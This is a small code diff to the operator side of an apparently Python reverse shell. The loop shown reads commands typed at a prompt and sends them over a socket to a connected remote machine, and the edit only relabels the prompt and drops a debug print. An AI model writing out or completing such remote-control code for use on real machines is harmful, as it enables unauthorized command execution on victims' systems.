@@ -23,8 +23,8 @@ def start_server():
                 break
             while s:
                 try:
-                    command = input(f"{cwd}> ")
-                    print("command is ", command.encode())
+                    command = input(f"(Reverse Shell) {cwd}> ")
+                    print("")
                     conn.send(command.encode())
                     response = ""
                     while True:
